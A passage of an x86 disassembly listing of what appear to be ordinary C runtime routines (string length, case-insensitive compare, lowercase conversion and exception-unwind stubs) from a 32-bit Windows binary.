  407dcd:	8b f0                	mov    %eax,%esi
  407dcf:	89 75 d8             	mov    %esi,-0x28(%ebp)
  407dd2:	3b f7                	cmp    %edi,%esi
  407dd4:	74 32                	je     0x407e08
  407dd6:	f6 45 0d 04          	testb  $0x4,0xd(%ebp)
  407dda:	74 40                	je     0x407e1c
  407ddc:	39 7d 1c             	cmp    %edi,0x1c(%ebp)
  407ddf:	0f 84 b2 00 00 00    	je     0x407e97
  407de5:	3b 75 1c             	cmp    0x1c(%ebp),%esi
  407de8:	7f 1e                	jg     0x407e08
  407dea:	ff 75 1c             	push   0x1c(%ebp)
  407ded:	ff 75 18             	push   0x18(%ebp)
  407df0:	53                   	push   %ebx
  407df1:	ff 75 dc             	push   -0x24(%ebp)
  407df4:	ff 75 0c             	push   0xc(%ebp)
  407df7:	ff 75 08             	push   0x8(%ebp)
  407dfa:	ff 15 00 91 40 00    	call   *0x409100
  407e00:	85 c0                	test   %eax,%eax
  407e02:	0f 85 8f 00 00 00    	jne    0x407e97
  407e08:	33 c0                	xor    %eax,%eax
  407e0a:	8d 65 c8             	lea    -0x38(%ebp),%esp
  407e0d:	8b 4d f0             	mov    -0x10(%ebp),%ecx
  407e10:	64 89 0d 00 00 00 00 	mov    %ecx,%fs:0x0
  407e17:	5f                   	pop    %edi
  407e18:	5e                   	pop    %esi
  407e19:	5b                   	pop    %ebx
  407e1a:	c9                   	leave
  407e1b:	c3                   	ret
  407e1c:	c7 45 fc 01 00 00 00 	movl   $0x1,-0x4(%ebp)
  407e23:	8d 04 36             	lea    (%esi,%esi,1),%eax
  407e26:	83 c0 03             	add    $0x3,%eax
  407e29:	24 fc                	and    $0xfc,%al
  407e2b:	e8 60 fb ff ff       	call   0x407990
  407e30:	89 65 e8             	mov    %esp,-0x18(%ebp)
  407e33:	8b dc                	mov    %esp,%ebx
  407e35:	89 5d e0             	mov    %ebx,-0x20(%ebp)
  407e38:	83 4d fc ff          	orl    $0xffffffff,-0x4(%ebp)
  407e3c:	eb 12                	jmp    0x407e50
  407e3e:	6a 01                	push   $0x1
  407e40:	58                   	pop    %eax
  407e41:	c3                   	ret
  407e42:	8b 65 e8             	mov    -0x18(%ebp),%esp
  407e45:	33 ff                	xor    %edi,%edi
  407e47:	33 db                	xor    %ebx,%ebx
  407e49:	83 4d fc ff          	orl    $0xffffffff,-0x4(%ebp)
  407e4d:	8b 75 d8             	mov    -0x28(%ebp),%esi
  407e50:	3b df                	cmp    %edi,%ebx
  407e52:	74 b4                	je     0x407e08
  407e54:	56                   	push   %esi
  407e55:	53                   	push   %ebx
  407e56:	ff 75 e4             	push   -0x1c(%ebp)
  407e59:	ff 75 dc             	push   -0x24(%ebp)
  407e5c:	ff 75 0c             	push   0xc(%ebp)
  407e5f:	ff 75 08             	push   0x8(%ebp)
  407e62:	ff 15 00 91 40 00    	call   *0x409100
  407e68:	85 c0                	test   %eax,%eax
  407e6a:	74 9c                	je     0x407e08
  407e6c:	39 7d 1c             	cmp    %edi,0x1c(%ebp)
  407e6f:	57                   	push   %edi
  407e70:	57                   	push   %edi
  407e71:	75 04                	jne    0x407e77
  407e73:	57                   	push   %edi
  407e74:	57                   	push   %edi
  407e75:	eb 06                	jmp    0x407e7d
  407e77:	ff 75 1c             	push   0x1c(%ebp)
  407e7a:	ff 75 18             	push   0x18(%ebp)
  407e7d:	56                   	push   %esi
  407e7e:	53                   	push   %ebx
  407e7f:	68 20 02 00 00       	push   $0x220
  407e84:	ff 75 20             	push   0x20(%ebp)
  407e87:	ff 15 b0 90 40 00    	call   *0x4090b0
  407e8d:	8b f0                	mov    %eax,%esi
  407e8f:	3b f7                	cmp    %edi,%esi
  407e91:	0f 84 71 ff ff ff    	je     0x407e08
  407e97:	8b c6                	mov    %esi,%eax
  407e99:	e9 6c ff ff ff       	jmp    0x407e0a
  407e9e:	8b 54 24 08          	mov    0x8(%esp),%edx
  407ea2:	8b 44 24 04          	mov    0x4(%esp),%eax
  407ea6:	85 d2                	test   %edx,%edx
  407ea8:	56                   	push   %esi
  407ea9:	8d 4a ff             	lea    -0x1(%edx),%ecx
  407eac:	74 0d                	je     0x407ebb
  407eae:	80 38 00             	cmpb   $0x0,(%eax)
  407eb1:	74 08                	je     0x407ebb
  407eb3:	40                   	inc    %eax
  407eb4:	8b f1                	mov    %ecx,%esi
  407eb6:	49                   	dec    %ecx
  407eb7:	85 f6                	test   %esi,%esi
  407eb9:	75 f3                	jne    0x407eae
  407ebb:	80 38 00             	cmpb   $0x0,(%eax)
  407ebe:	5e                   	pop    %esi
  407ebf:	75 05                	jne    0x407ec6
  407ec1:	2b 44 24 04          	sub    0x4(%esp),%eax
  407ec5:	c3                   	ret
  407ec6:	8b c2                	mov    %edx,%eax
  407ec8:	c3                   	ret
  407ec9:	56                   	push   %esi
  407eca:	8b 74 24 08          	mov    0x8(%esp),%esi
  407ece:	8b 46 0c             	mov    0xc(%esi),%eax
  407ed1:	a8 83                	test   $0x83,%al
  407ed3:	74 1d                	je     0x407ef2
  407ed5:	a8 08                	test   $0x8,%al
  407ed7:	74 19                	je     0x407ef2
  407ed9:	ff 76 08             	push   0x8(%esi)
  407edc:	e8 98 d2 ff ff       	call   0x405179
  407ee1:	66 81 66 0c f7 fb    	andw   $0xfbf7,0xc(%esi)
  407ee7:	33 c0                	xor    %eax,%eax
  407ee9:	59                   	pop    %ecx
  407eea:	89 06                	mov    %eax,(%esi)
  407eec:	89 46 08             	mov    %eax,0x8(%esi)
  407eef:	89 46 04             	mov    %eax,0x4(%esi)
  407ef2:	5e                   	pop    %esi
  407ef3:	c3                   	ret
  407ef4:	cc                   	int3
  407ef5:	cc                   	int3
  407ef6:	cc                   	int3
  407ef7:	cc                   	int3
  407ef8:	cc                   	int3
  407ef9:	cc                   	int3
  407efa:	cc                   	int3
  407efb:	cc                   	int3
  407efc:	cc                   	int3
  407efd:	cc                   	int3
  407efe:	cc                   	int3
  407eff:	cc                   	int3
  407f00:	ff 25 58 90 40 00    	jmp    *0x409058
  407f06:	cc                   	int3
  407f07:	cc                   	int3
  407f08:	cc                   	int3
  407f09:	cc                   	int3
  407f0a:	cc                   	int3
  407f0b:	cc                   	int3
  407f0c:	cc                   	int3
  407f0d:	cc                   	int3
  407f0e:	cc                   	int3
  407f0f:	cc                   	int3
  407f10:	55                   	push   %ebp
  407f11:	8b ec                	mov    %esp,%ebp
  407f13:	57                   	push   %edi
  407f14:	56                   	push   %esi
  407f15:	53                   	push   %ebx
  407f16:	8b 75 0c             	mov    0xc(%ebp),%esi
  407f19:	8b 7d 08             	mov    0x8(%ebp),%edi
  407f1c:	8d 05 80 c1 40 00    	lea    0x40c180,%eax
  407f22:	83 78 08 00          	cmpl   $0x0,0x8(%eax)
  407f26:	75 3b                	jne    0x407f63
  407f28:	b0 ff                	mov    $0xff,%al
  407f2a:	8b ff                	mov    %edi,%edi
  407f2c:	0a c0                	or     %al,%al
  407f2e:	74 2e                	je     0x407f5e
  407f30:	8a 06                	mov    (%esi),%al
  407f32:	46                   	inc    %esi
  407f33:	8a 27                	mov    (%edi),%ah
  407f35:	47                   	inc    %edi
  407f36:	38 c4                	cmp    %al,%ah
  407f38:	74 f2                	je     0x407f2c
  407f3a:	2c 41                	sub    $0x41,%al
  407f3c:	3c 1a                	cmp    $0x1a,%al
  407f3e:	1a c9                	sbb    %cl,%cl
  407f40:	80 e1 20             	and    $0x20,%cl
  407f43:	02 c1                	add    %cl,%al
  407f45:	04 41                	add    $0x41,%al
  407f47:	86 e0                	xchg   %ah,%al
  407f49:	2c 41                	sub    $0x41,%al
  407f4b:	3c 1a                	cmp    $0x1a,%al
  407f4d:	1a c9                	sbb    %cl,%cl
  407f4f:	80 e1 20             	and    $0x20,%cl
  407f52:	02 c1                	add    %cl,%al
  407f54:	04 41                	add    $0x41,%al
  407f56:	38 e0                	cmp    %ah,%al
  407f58:	74 d2                	je     0x407f2c
  407f5a:	1a c0                	sbb    %al,%al
  407f5c:	1c ff                	sbb    $0xff,%al
  407f5e:	0f be c0             	movsbl %al,%eax
  407f61:	eb 34                	jmp    0x407f97
  407f63:	b8 ff 00 00 00       	mov    $0xff,%eax
  407f68:	33 db                	xor    %ebx,%ebx
  407f6a:	8b ff                	mov    %edi,%edi
  407f6c:	0a c0                	or     %al,%al
  407f6e:	74 27                	je     0x407f97
  407f70:	8a 06                	mov    (%esi),%al
  407f72:	46                   	inc    %esi
  407f73:	8a 1f                	mov    (%edi),%bl
  407f75:	47                   	inc    %edi
  407f76:	38 d8                	cmp    %bl,%al
  407f78:	74 f2                	je     0x407f6c
  407f7a:	50                   	push   %eax
  407f7b:	53                   	push   %ebx
  407f7c:	e8 1b 00 00 00       	call   0x407f9c
  407f81:	8b d8                	mov    %eax,%ebx
  407f83:	83 c4 04             	add    $0x4,%esp
  407f86:	e8 11 00 00 00       	call   0x407f9c
  407f8b:	83 c4 04             	add    $0x4,%esp
  407f8e:	38 c3                	cmp    %al,%bl
  407f90:	74 da                	je     0x407f6c
  407f92:	1b c0                	sbb    %eax,%eax
  407f94:	83 d8 ff             	sbb    $0xffffffff,%eax
  407f97:	5b                   	pop    %ebx
  407f98:	5e                   	pop    %esi
  407f99:	5f                   	pop    %edi
  407f9a:	c9                   	leave
  407f9b:	c3                   	ret
  407f9c:	55                   	push   %ebp
  407f9d:	8b ec                	mov    %esp,%ebp
  407f9f:	51                   	push   %ecx
  407fa0:	83 3d 88 c1 40 00 00 	cmpl   $0x0,0x40c188
  407fa7:	53                   	push   %ebx
  407fa8:	56                   	push   %esi
  407fa9:	57                   	push   %edi
  407faa:	75 1d                	jne    0x407fc9
  407fac:	8b 45 08             	mov    0x8(%ebp),%eax
  407faf:	83 f8 41             	cmp    $0x41,%eax
  407fb2:	0f 8c aa 00 00 00    	jl     0x408062
  407fb8:	83 f8 5a             	cmp    $0x5a,%eax
  407fbb:	0f 8f a1 00 00 00    	jg     0x408062
  407fc1:	83 c0 20             	add    $0x20,%eax
  407fc4:	e9 99 00 00 00       	jmp    0x408062
  407fc9:	8b 5d 08             	mov    0x8(%ebp),%ebx
  407fcc:	bf 00 01 00 00       	mov    $0x100,%edi
  407fd1:	6a 01                	push   $0x1
  407fd3:	3b df                	cmp    %edi,%ebx
  407fd5:	5e                   	pop    %esi
  407fd6:	7d 25                	jge    0x407ffd
  407fd8:	39 35 94 be 40 00    	cmp    %esi,0x40be94
  407fde:	7e 0b                	jle    0x407feb
  407fe0:	56                   	push   %esi
  407fe1:	53                   	push   %ebx
  407fe2:	e8 a9 e9 ff ff       	call   0x406990
  407fe7:	59                   	pop    %ecx
  407fe8:	59                   	pop    %ecx
  407fe9:	eb 0a                	jmp    0x407ff5
  407feb:	a1 88 bc 40 00       	mov    0x40bc88,%eax
  407ff0:	8a 04 58             	mov    (%eax,%ebx,2),%al
  407ff3:	23 c6                	and    %esi,%eax
  407ff5:	85 c0                	test   %eax,%eax
  407ff7:	75 04                	jne    0x407ffd
  407ff9:	8b c3                	mov    %ebx,%eax
  407ffb:	eb 65                	jmp    0x408062
  407ffd:	8b 15 88 bc 40 00    	mov    0x40bc88,%edx
  408003:	8b c3                	mov    %ebx,%eax
  408005:	c1 f8 08             	sar    $0x8,%eax
  408008:	0f b6 c8             	movzbl %al,%ecx
  40800b:	f6 44 4a 01 80       	testb  $0x80,0x1(%edx,%ecx,2)
  408010:	74 0f                	je     0x408021
  408012:	80 65 0a 00          	andb   $0x0,0xa(%ebp)
  408016:	6a 02                	push   $0x2
  408018:	88 45 08             	mov    %al,0x8(%ebp)
  40801b:	88 5d 09             	mov    %bl,0x9(%ebp)
  40801e:	58                   	pop    %eax
  40801f:	eb 09                	jmp    0x40802a
  408021:	80 65 09 00          	andb   $0x0,0x9(%ebp)
  408025:	88 5d 08             	mov    %bl,0x8(%ebp)
  408028:	8b c6                	mov    %esi,%eax
  40802a:	56                   	push   %esi
  40802b:	6a 00                	push   $0x0
  40802d:	8d 4d fc             	lea    -0x4(%ebp),%ecx
  408030:	6a 03                	push   $0x3
  408032:	51                   	push   %ecx
  408033:	50                   	push   %eax
  408034:	8d 45 08             	lea    0x8(%ebp),%eax
  408037:	50                   	push   %eax
  408038:	57                   	push   %edi
  408039:	ff 35 88 c1 40 00    	push   0x40c188
  40803f:	e8 36 fc ff ff       	call   0x407c7a
  408044:	83 c4 20             	add    $0x20,%esp
  408047:	85 c0                	test   %eax,%eax
  408049:	74 ae                	je     0x407ff9
  40804b:	3b c6                	cmp    %esi,%eax
  40804d:	75 06                	jne    0x408055
  40804f:	0f b6 45 fc          	movzbl -0x4(%ebp),%eax
  408053:	eb 0d                	jmp    0x408062
  408055:	0f b6 45 fd          	movzbl -0x3(%ebp),%eax
  408059:	0f b6 4d fc          	movzbl -0x4(%ebp),%ecx
  40805d:	c1 e0 08             	shl    $0x8,%eax
  408060:	0b c1                	or     %ecx,%eax
  408062:	5f                   	pop    %edi
  408063:	5e                   	pop    %esi
  408064:	5b                   	pop    %ebx
  408065:	c9                   	leave
  408066:	c3                   	ret
  408067:	cc                   	int3
  408068:	ff 75 e8             	push   -0x18(%ebp)
  40806b:	e8 e9 b8 ff ff       	call   0x403959
  408070:	59                   	pop    %ecx
  408071:	c3                   	ret
  408072:	ff 75 e8             	push   -0x18(%ebp)
  408075:	e8 df b8 ff ff       	call   0x403959
  40807a:	59                   	pop    %ecx
  40807b:	c3                   	ret
  40807c:	b8 60 99 40 00       	mov    $0x409960,%eax
  408081:	e9 6f b9 ff ff       	jmp    0x4039f5
  408086:	cc                   	int3
  408087:	cc                   	int3
  408088:	ff 75 f0             	push   -0x10(%ebp)
  40808b:	e8 c9 b8 ff ff       	call   0x403959
  408090:	59                   	pop    %ecx
  408091:	c3                   	ret
  408092:	b8 90 99 40 00       	mov    $0x409990,%eax
  408097:	e9 59 b9 ff ff       	jmp    0x4039f5
  40809c:	ff 75 f0             	push   -0x10(%ebp)
  40809f:	e8 b5 b8 ff ff       	call   0x403959
  4080a4:	59                   	pop    %ecx
  4080a5:	c3                   	ret
  4080a6:	b8 b8 99 40 00       	mov    $0x4099b8,%eax
  4080ab:	e9 45 b9 ff ff       	jmp    0x4039f5
  4080b0:	ff 75 e4             	push   -0x1c(%ebp)
  4080b3:	e8 a1 b8 ff ff       	call   0x403959
  4080b8:	59                   	pop    %ecx
  4080b9:	c3                   	ret
  4080ba:	ff 75 e4             	push   -0x1c(%ebp)
  4080bd:	e8 97 b8 ff ff       	call   0x403959
  4080c2:	59                   	pop    %ecx
  4080c3:	c3                   	ret
  4080c4:	b8 e0 99 40 00       	mov    $0x4099e0,%eax
  4080c9:	e9 27 b9 ff ff       	jmp    0x4039f5
  4080ce:	cc                   	int3
  4080cf:	cc                   	int3
  4080d0:	ff 75 f0             	push   -0x10(%ebp)
  4080d3:	e8 81 b8 ff ff       	call   0x403959
  4080d8:	59                   	pop    %ecx
  4080d9:	c3                   	ret
  4080da:	b8 10 9a 40 00       	mov    $0x409a10,%eax
  4080df:	e9 11 b9 ff ff       	jmp    0x4039f5
  4080e4:	ff 75 ec             	push   -0x14(%ebp)
  4080e7:	e8 6d b8 ff ff       	call   0x403959
  4080ec:	59                   	pop    %ecx
  4080ed:	c3                   	ret
  4080ee:	ff 75 ec             	push   -0x14(%ebp)
  4080f1:	e8 63 b8 ff ff       	call   0x403959
  4080f6:	59                   	pop    %ecx
  4080f7:	c3                   	ret
  4080f8:	b8 38 9a 40 00       	mov    $0x409a38,%eax
  4080fd:	e9 f3 b8 ff ff       	jmp    0x4039f5
  408102:	cc                   	int3
  408103:	cc                   	int3
  408104:	ff 75 c4             	push   -0x3c(%ebp)
  408107:	e8 4d b8 ff ff       	call   0x403959
  40810c:	59                   	pop    %ecx
  40810d:	c3                   	ret
  40810e:	b8 68 9a 40 00       	mov    $0x409a68,%eax
  408113:	e9 dd b8 ff ff       	jmp    0x4039f5
  408118:	8b 45 f0             	mov    -0x10(%ebp),%eax
  40811b:	83 e0 01             	and    $0x1,%eax
  40811e:	85 c0                	test   %eax,%eax
  408120:	0f 84 0b 00 00 00    	je     0x408131
  408126:	8b 4d ec             	mov    -0x14(%ebp),%ecx
  408129:	83 c1 08             	add    $0x8,%ecx
  40812c:	e9 0f ae ff ff       	jmp    0x402f40
  408131:	c3                   	ret
  408132:	ff 75 14             	push   0x14(%ebp)
  408135:	e8 1f b8 ff ff       	call   0x403959
  40813a:	59                   	pop    %ecx
  40813b:	c3                   	ret
  40813c:	8b 4d ec             	mov    -0x14(%ebp),%ecx
  40813f:	83 c1 08             	add    $0x8,%ecx
  408142:	e9 b2 af ff ff       	jmp    0x4030f9
  408147:	b8 90 9a 40 00       	mov    $0x409a90,%eax
  40814c:	e9 a4 b8 ff ff       	jmp    0x4039f5
  408151:	cc                   	int3
  408152:	cc                   	int3
  408153:	cc                   	int3
  408154:	8b 45 f0             	mov    -0x10(%ebp),%eax
  408157:	83 e0 01             	and    $0x1,%eax
  40815a:	85 c0                	test   %eax,%eax
  40815c:	0f 84 0b 00 00 00    	je     0x40816d
  408162:	8b 4d ec             	mov    -0x14(%ebp),%ecx
  408165:	83 c1 0c             	add    $0xc,%ecx
  408168:	e9 d3 ad ff ff       	jmp    0x402f40
  40816d:	c3                   	ret
  40816e:	ff 75 14             	push   0x14(%ebp)
  408171:	e8 e3 b7 ff ff       	call   0x403959
  408176:	59                   	pop    %ecx
  408177:	c3                   	ret
  408178:	8b 4d ec             	mov    -0x14(%ebp),%ecx
  40817b:	83 c1 0c             	add    $0xc,%ecx
  40817e:	e9 6f b1 ff ff       	jmp    0x4032f2
  408183:	b8 c8 9a 40 00       	mov    $0x409ac8,%eax
  408188:	e9 68 b8 ff ff       	jmp    0x4039f5
  40818d:	cc                   	int3
  40818e:	cc                   	int3
  40818f:	cc                   	int3
  408190:	8b 4d f0             	mov    -0x10(%ebp),%ecx
  408193:	e9 0b b3 ff ff       	jmp    0x4034a3
  408198:	b8 00 9b 40 00       	mov    $0x409b00,%eax
  40819d:	e9 53 b8 ff ff       	jmp    0x4039f5
  4081a2:	cc                   	int3
  4081a3:	cc                   	int3
  4081a4:	8b 45 f0             	mov    -0x10(%ebp),%eax
  4081a7:	83 e0 01             	and    $0x1,%eax
  4081aa:	85 c0                	test   %eax,%eax
  4081ac:	0f 84 0b 00 00 00    	je     0x4081bd
  4081b2:	8b 4d ec             	mov    -0x14(%ebp),%ecx
  4081b5:	83 c1 14             	add    $0x14,%ecx
  4081b8:	e9 83 ad ff ff       	jmp    0x402f40
  4081bd:	c3                   	ret
  4081be:	ff 75 14             	push   0x14(%ebp)
  4081c1:	e8 93 b7 ff ff       	call   0x403959
  4081c6:	59                   	pop    %ecx
  4081c7:	c3                   	ret
  4081c8:	8b 4d ec             	mov    -0x14(%ebp),%ecx
  4081cb:	83 c1 14             	add    $0x14,%ecx
  4081ce:	e9 bb b5 ff ff       	jmp    0x40378e
  4081d3:	b8 28 9b 40 00       	mov    $0x409b28,%eax
  4081d8:	e9 18 b8 ff ff       	jmp    0x4039f5
  4081dd:	cc                   	int3
  4081de:	cc                   	int3
  4081df:	cc                   	int3
  4081e0:	8b 45 f0             	mov    -0x10(%ebp),%eax
  4081e3:	83 e0 01             	and    $0x1,%eax
  4081e6:	85 c0                	test   %eax,%eax
  4081e8:	0f 84 0b 00 00 00    	je     0x4081f9
  4081ee:	8b 4d ec             	mov    -0x14(%ebp),%ecx
  4081f1:	83 c1 08             	add    $0x8,%ecx
  4081f4:	e9 47 ad ff ff       	jmp    0x402f40
  4081f9:	c3                   	ret
  4081fa:	b8 60 9b 40 00       	mov    $0x409b60,%eax
  4081ff:	e9 f1 b7 ff ff       	jmp    0x4039f5
  408204:	8b 45 f0             	mov    -0x10(%ebp),%eax
  408207:	83 e0 01             	and    $0x1,%eax
  40820a:	85 c0                	test   %eax,%eax
  40820c:	0f 84 0b 00 00 00    	je     0x40821d
  408212:	8b 4d ec             	mov    -0x14(%ebp),%ecx
  408215:	83 c1 0c             	add    $0xc,%ecx
  408218:	e9 23 ad ff ff       	jmp    0x402f40
  40821d:	c3                   	ret
  40821e:	b8 88 9b 40 00       	mov    $0x409b88,%eax
  408223:	e9 cd b7 ff ff       	jmp    0x4039f5
  408228:	8b 45 f0             	mov    -0x10(%ebp),%eax
  40822b:	83 e0 01             	and    $0x1,%eax
  40822e:	85 c0                	test   %eax,%eax
  408230:	0f 84 0b 00 00 00    	je     0x408241
  408236:	8b 4d ec             	mov    -0x14(%ebp),%ecx
  408239:	83 c1 14             	add    $0x14,%ecx
  40823c:	e9 ff ac ff ff       	jmp    0x402f40
  408241:	c3                   	ret
  408242:	8b 4d ec             	mov    -0x14(%ebp),%ecx
  408245:	83 c1 0c             	add    $0xc,%ecx
  408248:	e9 a5 b0 ff ff       	jmp    0x4032f2
  40824d:	b8 b0 9b 40 00       	mov    $0x409bb0,%eax
  408252:	e9 9e b7 ff ff       	jmp    0x4039f5
  408257:	cc                   	int3
  408258:	8b 4d f0             	mov    -0x10(%ebp),%ecx
  40825b:	83 e9 08             	sub    $0x8,%ecx
  40825e:	e9 8f b0 ff ff       	jmp    0x4032f2
  408263:	b8 e0 9b 40 00       	mov    $0x409be0,%eax
  408268:	e9 88 b7 ff ff       	jmp    0x4039f5
